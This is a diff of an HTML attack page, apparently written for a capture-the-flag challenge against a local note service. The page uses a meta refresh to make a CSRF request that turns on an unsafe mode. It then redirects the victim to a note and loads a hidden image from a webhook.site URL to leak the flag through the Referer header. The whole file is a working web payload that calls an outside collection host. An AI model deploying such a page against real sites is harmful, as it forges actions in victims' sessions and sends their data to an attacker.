@@ -1,10 +1,18 @@
 <html>
   <head>
-    <!-- STEP 1: Enable Unsafe Mode for note ID=1 -->
+    <!-- STEP 1: Enable Unsafe Mode for note ID=1 (CSRF) -->
     <meta http-equiv="refresh" content="0; url=http://127.0.0.1:7189/prefs/unsafe?id=1&enable=1" />
   </head>
   <body>
-    <!-- STEP 2: Redirect to the note and leak flag via Referer -->
-    <img src="https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0" onerror="location.href='http://127.0.0.1:7189/notes/1'" />
+    <!-- STEP 2: After 2 seconds, load the note and leak the flag via Referer -->
+    <script>
+      setTimeout(() => {
+        // Redirect to the note (flag will be in Referer)
+        window.location = "http://127.0.0.1:7189/notes/1";
+      }, 2000);
+    </script>
+    
+    <!-- Fallback: If JS is blocked, use an image to force Referer leakage -->
+    <img src="https://webhook.site/d1b4da46-4ad8-4ec4-8241-bcdbcefd6aa0?leak=1" style="display:none;" />
   </body>
 </html>
